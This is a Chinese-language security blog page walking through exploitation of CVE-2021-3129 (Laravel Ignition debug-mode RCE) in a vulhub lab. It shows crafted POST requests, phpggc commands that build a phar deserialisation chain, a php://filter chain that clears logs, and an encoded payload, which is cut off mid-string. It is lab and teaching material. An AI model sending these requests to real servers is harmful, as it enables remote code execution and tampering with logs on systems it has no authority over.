@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="si1ent">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      Laravel | si1ent
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>si1ent</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>Laravel</h2>
+  <p class="post-date">2021-05-06</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Laravel 是开源免费的PHP框架，有较多企业及个人在使用。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/laravel/CVE-2021-3129">docker</a></p>
+<h3 id="漏洞实战分类"><a href="#漏洞实战分类" class="headerlink" title="漏洞实战分类"></a>漏洞实战分类</h3><h4 id="CVE-2021-3129"><a href="#CVE-2021-3129" class="headerlink" title="CVE-2021-3129"></a>CVE-2021-3129</h4><h5 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>在开发模式下，Laravel使用了Ignition提供的错误页面，在Ignition 2.5.1及之前的版本中，有类似这样的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$contents = file_get_contents($parameters[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">file_put_contents($parameters[<span class="string">&#x27;viewFile&#x27;</span>], $contents);</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以通过<code>phar://</code>协议来执行反序列化操作，进而执行任意代码。</p>
+<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>Laravel 8.4.2</p>
+<p>Ignition 2.5.1</p>
+<p>debug开启</p>
+<h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$contents = file_get_contents($parameters[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">file_put_contents($parameters[<span class="string">&#x27;viewFile&#x27;</span>], $contents);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里主要功能点是：读取一个给定的路径 <code>$parameters[&#39;viewFile&#39;]</code>，并替换读取到的内容中的 <code>$variableName</code> 为<code>$variableName ?? &#39;&#39;</code>，之后写回文件中 <code>$parameters[&#39;viewFile&#39;]</code>，这相当于什么都没有做！</p>
+<p>由于这里调用了<code>file_get_contents()</code>，且其中的参数可控，所以这里可以通过 <code>phar://</code> 协议去触发phar反序列化。如果后期利用框架进行开发的人员写出了一个文件上传的功能，那么我们就可以上传一个恶意phar文件，利用上述的 <code>file_get_contents()</code> 去触发phar反序列化，达到RCE的效果。</p>
+<h5 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Laravel &lt;8.4.2</p>
+<p>Ignition &lt;2.5.1</p>
+<p>debug开启</p>
+<h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8080&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Laravel/image-20210413110550762.png" alt="image-20210413110550762"></p>
+<p>2、构造如下POST请求</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.20</span><span class="number">.120</span>:<span class="number">8000</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: <span class="number">168</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="line">  <span class="string">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">    <span class="string">&quot;viewFile&quot;</span>: <span class="string">&quot;xxxxxxx&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会出现以下Ignition的报错，说明漏洞存在，且开启了debug模式：</p>
+<p><img src="/images/Laravel/image-20210415151140255.png" alt="image-20210415151140255"></p>
+<p>3、Phar反序列化</p>
+<p>条件：把如下文件上传至存在漏洞服务器上.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># apt install git-all</span><br><span class="line"># chmod 777 .&#x2F;phpggc&#x2F;phpggc</span><br><span class="line"># apt install php</span><br><span class="line">从phpggc里拿一条laravel中存在的拓展的链子。</span><br><span class="line">php -d &quot;phar.readonly&#x3D;0&quot; .&#x2F;phpggc Laravel&#x2F;RCE5 &quot;phpinfo();&quot; --phar phar -o &#x2F;tmp&#x2F;phar.gif</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Laravel/image-20210416135045865.png" alt="image-20210416135045865"></p>
+<p>假设后期利用框架进行开发的人员写出了一个文件上传的功能，那么我们就可以将这个phar文件上传上去，这里我们手动将其放入laravel的目录下，然后构造如下请求，利用上述的 <code>file_get_contents()</code> 去触发phar反序列化：</p>
+<p>4、构造PoC访问刚才上传文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.20.120:8000</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 194</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;phar:///var/www/phar.gif/test.txt&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Laravel/image-20210416134409998.png" alt="image-20210416134409998"></p>
+<center>如上图所示RCE成功</center>
+
+<p>5、laravel.log实现phar反序列化</p>
+<p>该利用方法的核心步骤是将laravel.log里的内容清空，然后利用php://filter/write=写入phar反序列化的payload，最后发送请求利用 <code>file_get_contents()</code> 去触发phar反序列化。</p>
+<p>这里，在清空laravel.log的内容时，作者在文章中提出的思路是使用<code>php://filter</code>中的<code>convert.base64-decode</code>过滤器的特性，将log清空。有的人可能会想到一直convert.base64-decode，直到都为不可见字符解码清空。但是这个做法会有问题。因为base64在解码的时候如果等号后面还有内容则会报错。所以正确的做法是先用convert.iconv.utf-8.utf-16be将utf-8转为utf-16，然后再用convert.quoted-printable-encode打印所有不可见字符，然后再用convert.iconv.utf-16be.utf-8将utf-16转为utf-8，完成上述操作后laravel.log中所有字符转为不可见字符，最后convert.base64-decode即可。<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9030?page=1#toc-6">详情</a></p>
+<p>将上述链条合起来就是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;storage&#x2F;logs&#x2F;laravel.log</span><br></pre></td></tr></table></figure>
+
+<p>6、清理日志</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.20.120:8080</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 328</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;storage&#x2F;logs&#x2F;laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Laravel/image-20210416144140804.png" alt="image-20210416144140804"></p>
+<p>7、用phpggc生成phar序列化利用POC（编码后的）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d &quot;phar.readonly&#x3D;0&quot; .&#x2F;phpggc Laravel&#x2F;RCE5 &quot;phpinfo();&quot; --phar phar -o php:&#x2F;&#x2F;output | base64 -w 0 | python -c &quot;import sys;print(&#39;&#39;.join([&#39;&#x3D;&#39; + hex(ord(i))[2:] + &#39;&#x3D;00&#39; for i in sys.stdin.read()]).upper())&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到的POC（编码后的）最后面再加一个a，否则最终laravel.log里面将生成两个POC，导致利用失败：</p>
+<p><img src="/images/Laravel/image-20210416144454795.png" alt="image-20210416144454795"></p>
+<p>8、发送如下数据包，给Log增加一次前缀，用于对齐：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.20.120:8080</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>9、将POC作为viewFile的值，发送数据包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.12:8000</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 5058</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;&#x3D;50&#x3D;00&#x3D;44&#x3D;00&#x3D;39&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;48&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;58&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;49&#x3D;00&#x3D;51&#x3D;00&#x3D;55&#x3D;00&#x3D;78&#x3D;00&#x3D;55&#x3D;00&#x3D;58&#x3D;00&#x3D;30&#x3D;00&#x3D;4E&#x3D;00&#x3D;50&#x3D;00&#x3D;54&#x3D;00&#x3D;56&#x3D;00&#x3D;42&#x3D;00&#x3D;4A&#x3D;00&#x3D;54&#x3D;00&#x3D;45&#x3D;00&#x3D;56&#x3D;00&#x3D;53&#x3D;00&#x3D;4B&#x3D;00&#x3D;43&#x3D;00&#x3D;6B&#x3D;00&#x3D;37&#x3D;00&#x3D;49&#x3D;00&#x3D;44&#x3D;00&#x3D;38&#x3D;00&#x3D;2B&#x3D;00&#x3D;44&#x3D;00&#x3D;51&#x3D;00&#x3D;6F&#x3D;00&#x3D;66&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;44&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;51&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;54&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;30&#x3D;00&#x3D;4D&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;53&#x3D;00&#x3D;57&#x3D;00&#x3D;78&#x3D;00&#x3D;73&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;31&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;46&#x3D;00&#x3D;30&#x3D;00&#x3D;5A&#x3D;00&#x3D;56&#x3D;00&#x3D;78&#x3D;00&#x3D;43&#x3D;00&#x3D;63&#x3D;00&#x3D;6D&#x3D;00&#x3D;39&#x3D;00&#x3D;68&#x3D;00&#x3D;5A&#x3D;00&#x3D;47&#x3D;00&#x3D;4E&#x3D;00&#x3D;68&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;52&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;64&#x3D;00&#x3D;63&#x3D;00&#x3D;55&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;75&#x3D;00&#x3D;5A&#x3D;00&#x3D;47&#x3D;00&#x3D;6C&#x3D;00&#x3D;75&#x3D;00&#x3D;5A&#x3D;00&#x3D;30&#x3D;00&#x3D;4A&#x3D;00&#x3D;79&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;46&#x3D;00&#x3D;6B&#x3D;00&#x3D;59&#x3D;00&#x3D;32&#x3D;00&#x3D;46&#x3D;00&#x3D;7A&#x3D;00&#x3D;64&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;35&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;6C&#x3D;00&#x3D;64&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;75&#x3D;00&#x3D;64&#x3D;00&#x3D;48&#x3D;00&#x3D;4D&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;30&#x3D;00&#x3D;38&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;55&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6B&#x3D;00&#x3D;6C&#x3D;00&#x3D;73&#x3D;00&#x3D;62&#x3D;00&#x3D;48&#x3D;00&#x3D;56&#x3D;00&#x3D;74&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;68&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;63&#x3D;00&#x3D;51&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;7A&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;52&#x3D;00&#x3D;70&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;42&#x3D;00&#x3D;68&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;4E&#x3D;00&#x3D;6F&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;59&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;48&#x3D;00&#x3D;46&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;56&#x3D;00&#x3D;6C&#x3D;00&#x3D;55&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;7A&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;32&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;30&#x3D;00&#x3D;38&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;55&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6B&#x3D;00&#x3D;31&#x3D;00&#x3D;76&#x3D;00&#x3D;59&#x3D;00&#x3D;32&#x3D;00&#x3D;74&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6E&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;54&#x3D;00&#x3D;47&#x3D;00&#x3D;39&#x3D;00&#x3D;68&#x3D;00&#x3D;5A&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;56&#x3D;00&#x3D;32&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;78&#x3D;00&#x3D;4D&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;46&#x3D;00&#x3D;6B&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;41&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;33&#x3D;00&#x3D;31&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;73&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;46&#x3D;00&#x3D;6B&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;39&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4F&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;6E&#x3D;00&#x3D;51&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;30&#x3D;00&#x3D;38&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;7A&#x3D;00&#x3D;67&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6B&#x3D;00&#x3D;6C&#x3D;00&#x3D;73&#x3D;00&#x3D;62&#x3D;00&#x3D;48&#x3D;00&#x3D;56&#x3D;00&#x3D;74&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;68&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;63&#x3D;00&#x3D;51&#x3D;00&#x3D;6E&#x3D;00&#x3D;4A&#x3D;00&#x3D;76&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;52&#x3D;00&#x3D;6A&#x3D;00&#x3D;59&#x3D;00&#x3D;58&#x3D;00&#x3D;4E&#x3D;00&#x3D;30&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6E&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;4A&#x3D;00&#x3D;79&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;46&#x3D;00&#x3D;6B&#x3D;00&#x3D;59&#x3D;00&#x3D;32&#x3D;00&#x3D;46&#x3D;00&#x3D;7A&#x3D;00&#x3D;64&#x3D;00&#x3D;45&#x3D;00&#x3D;56&#x3D;00&#x3D;32&#x3D;00&#x3D;5A&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;30&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;6E&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;6A&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;35&#x3D;00&#x3D;75&#x3D;00&#x3D;5A&#x3D;00&#x3D;57&#x3D;00&#x3D;4E&#x3D;00&#x3D;30&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;39&#x3D;00&#x3D;75&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;50&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;4D&#x3D;00&#x3D;79&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;4E&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;4E&#x3D;00&#x3D;72&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;35&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;64&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;59&#x3D;00&#x3D;58&#x3D;00&#x3D;52&#x3D;00&#x3D;76&#x3D;00&#x3D;63&#x3D;00&#x3D;6C&#x3D;00&#x3D;78&#x3D;00&#x3D;4E&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;4E&#x3D;00&#x3D;72&#x3D;00&#x3D;52&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;6D&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;70&#x3D;00&#